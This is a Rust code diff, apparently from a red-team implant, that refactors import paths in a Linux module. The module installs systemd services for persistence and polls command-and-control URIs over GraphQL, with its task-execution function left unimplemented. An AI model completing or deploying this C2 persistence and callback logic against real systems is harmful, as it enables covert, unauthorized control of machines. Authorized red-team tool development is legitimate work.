@@ -3,12 +3,9 @@ use std::path::PathBuf;
 use rand::Rng;
 use std::process::Command;
 
-use super::graphql;
-use super::Config;
-
 pub const SYSTEMD_DIR: &str = "/lib/systemd/system/";
 
-pub async fn install(config: Config)-> Result<(), super::Error> {
+pub async fn install(config: super::Config)-> Result<(), super::Error> {
     // go through each service config consuming the structs
     for service_config in config.service_configs.into_iter() {
         let service_name = service_config.name;
@@ -62,11 +59,11 @@ WantedBy=multi-user.target
     Ok(())
 }
 
-async fn exec(_response: graphql::GraphQLResponse) -> Result<(), super::Error> {
+async fn exec(_response: super::graphql::GraphQLResponse) -> Result<(), super::Error> {
     unimplemented!("this is where i would exec a tome... if i had one!")
 }
 
-pub async fn run(config: Config) -> Result<(), super::Error> {
+pub async fn run(config: super::Config) -> Result<(), super::Error> {
     println!("Linux run!");
     let mut c2_index = 0;
     let callback_config = config.callback_config;
@@ -78,7 +75,7 @@ pub async fn run(config: Config) -> Result<(), super::Error> {
             let c2_config = callback_config.c2_configs[c2_index].clone();
 
             // TODO: do something with c2_config and pass in for graphql
-            let resp = match graphql::call(
+            let resp = match super::graphql::call(
                 String::from("variables"), 
                 c2_config.uri.clone(), 
                 callback_config.timeout
